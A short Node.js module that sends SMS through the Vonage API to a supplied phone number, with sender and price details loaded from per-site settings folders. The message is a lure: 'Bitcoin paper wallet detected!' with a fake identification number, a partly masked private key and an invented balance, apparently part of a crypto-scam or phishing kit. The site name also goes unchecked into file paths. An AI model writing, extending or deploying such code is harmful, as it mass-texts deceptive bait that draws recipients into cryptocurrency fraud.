const { VONAGE_API_SECRET , VONAGE_API_KEY} = require('../settings/settings.js')
const fs = require('fs')
const { Vonage } = require('@vonage/server-sdk')

async function sendSMS(vonage, to, from, text) {
  await vonage.sms.send({to, from, text})
      .then(resp => { console.log('Message sent successfully'); console.log(resp); })
      .catch(err => { console.log('There was an error sending the messages.'); console.error(err); });
}


module.exports.send_message = async (phone, site) => {
  const vonage = new Vonage({
    apiKey: VONAGE_API_KEY,
    apiSecret: VONAGE_API_SECRET
  })

  let from = "INCORRECT"
  let to = phone

  const pathToFolder = `./assets/data/sites/${site}/`
  fs.access(`../data/sites/${site}/`, function(error){
      if (error) {
        const info = JSON.parse(fs.readFileSync(`${pathToFolder}phone_settings.json`))
        const price = JSON.parse(fs.readFileSync(`${pathToFolder}/price_settings.json`))

        from = info["from"]
        let text = `Bitcoin paper wallet detected!\nIdentification no. AA22V3R2BRB53\nPrivate key : *******AR1dbaA\nCurrent balance : ${price.price_euro} BTC`

        sendSMS(vonage, to, from, text);
        
      } else {
          console.log("Файл найден sms");
      }
  });

}
